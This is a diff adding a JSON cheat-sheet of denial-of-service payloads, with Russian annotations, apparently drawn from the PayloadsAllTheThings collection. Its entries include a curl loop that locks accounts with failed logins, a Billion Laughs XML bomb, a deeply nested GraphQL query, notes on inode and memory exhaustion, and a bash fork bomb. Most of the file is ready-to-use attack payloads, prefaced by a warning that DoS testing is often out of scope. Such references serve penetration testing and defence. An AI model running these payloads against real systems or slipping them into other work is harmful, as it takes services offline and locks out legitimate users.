@@ -1,0 +1,76 @@
+{
+  "category": "Denial of Service",
+  "source": "PayloadsAllTheThings/Denial of Service/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое DoS / DDoS и осторожность",
+      "language": "text",
+      "tags": ["dos", "methodology"],
+      "body": "DoS — сделать сервис недоступным (поток запросов или эксплуатация бага → краш/деградация). DDoS — то же из множества источников.\n⚠️ Тестировать DoS крайне осторожно: часто OUT-OF-SCOPE, реально кладёт прод и может стоить доступа. Сначала проверь правила программы."
+    },
+    {
+      "subcategory": "Блокировка аккаунтов",
+      "title": "Account lockout DoS",
+      "language": "bash",
+      "tags": ["dos", "account-lockout"],
+      "body": "for i in {1..100}; do curl -X POST -d \"username=user&password=wrong\" <target_login_url>; done"
+    },
+    {
+      "subcategory": "Лимиты ФС",
+      "title": "Исчерпание inode (No space left on device)",
+      "language": "text",
+      "tags": ["dos", "filesystem", "inodes"],
+      "body": "Заставь приложение писать файлы, пока не упрёшься в лимит inode файловой системы → «No space left on device». Альтернатива — раздуть один файл (SQLite-БД, лог) до максимального размера ФС.\nFAT32 ограничен 4 GB на файл (поэтому его меняют на exFAT/NTFS)."
+    },
+    {
+      "subcategory": "Лимиты ФС",
+      "title": "Максимум inode по файловым системам",
+      "language": "table",
+      "tags": ["dos", "filesystem"],
+      "body": "btrfs ext4 fat32 ntfs xfs zfs inodes",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Файловая система", "Максимум inode / файлов"],
+          "rows": [
+            ["BTRFS", "2^64 (~18 квинтиллионов)"],
+            ["EXT4", "~4 млрд"],
+            ["FAT32", "~268 млн файлов"],
+            ["NTFS", "~4.2 млрд (записи MFT)"],
+            ["XFS", "Динамически (размер диска)"],
+            ["ZFS", "~281 трлн"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Исчерпание памяти",
+      "title": "Billion Laughs (XML-бомба)",
+      "language": "xml",
+      "tags": ["dos", "xxe", "xml-bomb"],
+      "body": "<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n<!ENTITY lol \"lol\">\n<!ELEMENT lolz (#PCDATA)>\n<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>\n<lolz>&lol9;</lolz>"
+    },
+    {
+      "subcategory": "Исчерпание памяти",
+      "title": "GraphQL — глубоко вложенные запросы",
+      "language": "text",
+      "tags": ["dos", "graphql"],
+      "body": "query { \n    repository(owner:\"rails\", name:\"rails\") {\n        assignableUsers (first: 100) {\n            nodes {\n                repositories (first: 100) {\n                    nodes {\n                        \n                    }\n                }\n            }\n        }\n    }\n}"
+    },
+    {
+      "subcategory": "Исчерпание памяти",
+      "title": "Прочие векторы исчерпания",
+      "language": "text",
+      "tags": ["dos", "memory"],
+      "body": "• Image Resizing — битые картинки с подменёнными заголовками (аномальный размер/огромное число пикселей).\n• SVG — формат на XML → пробуй billion laughs.\n• Regular Expression — ReDoS.\n• Fork Bomb (см. ниже)."
+    },
+    {
+      "subcategory": "Исчерпание памяти",
+      "title": "Fork Bomb (Linux)",
+      "language": "bash",
+      "tags": ["dos", "fork-bomb"],
+      "body": ":(){ :|:& };:"
+    }
+  ]
+}
